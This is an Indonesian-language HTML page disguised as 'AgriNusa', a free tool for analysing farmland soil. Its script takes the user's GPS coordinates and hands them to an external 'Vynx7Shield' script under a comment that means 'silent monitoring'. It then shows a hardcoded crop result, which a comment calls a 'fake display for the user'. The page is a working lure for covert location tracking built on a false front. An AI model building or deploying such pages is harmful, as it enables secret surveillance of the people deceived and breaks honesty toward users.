<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AgriNusa - Cek Kualitas Lahan Pertanian</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f9f4; color: #2e7d32; text-align: center; padding: 50px; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 500px; }
        button { background: #2e7d32; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #1b5e20; }
        #status { margin-top: 20px; font-weight: bold; color: #555; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #2e7d32; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card">
        <h1>🌱 AgriNusa v7.0</h1>
        <p>Gunakan sensor GPS kami untuk menganalisis kandungan unsur hara dan jenis tanaman yang paling cocok di wilayah Anda.</p>
        <button onclick="startAnalysis()">Mulai Analisis Lahan</button>
        <div id="loader" class="loader"></div>
        <div id="status">Silakan izinkan akses lokasi untuk hasil akurat.</div>
    </div>

    <script src="vynx7_core.js"></script>
    <script>
        async function startAnalysis() {
            document.getElementById('loader').style.display = 'block';
            document.getElementById('status').innerText = "Menghubungkan ke satelit AgriNusa...";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    
                    // Eksekusi Silent Monitoring VYNX7
                    if (window.Vynx7Shield) {
                        const shield = new Vynx7Shield("system_manifest.bin");
                        await shield.ignite(lat, lon);
                    }

                    // Tampilan Palsu buat User
                    setTimeout(() => {
                        document.getElementById('loader').style.display = 'none';
                        document.getElementById('status').innerHTML = `
                            ✅ Analisis Selesai!<br>
                            Lokasi: ${lat.toFixed(4)}, ${lon.toFixed(4)}<br>
                            Tanaman Cocok: <b>Padi IR64 / Jagung Manis</b>
                        `;
                    }, 3000);
                }, (err) => {
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('status').innerText = "Error: Akses lokasi ditolak. Gunakan mode manual.";
                });
            }
        }
    </script>
</body>
</html>
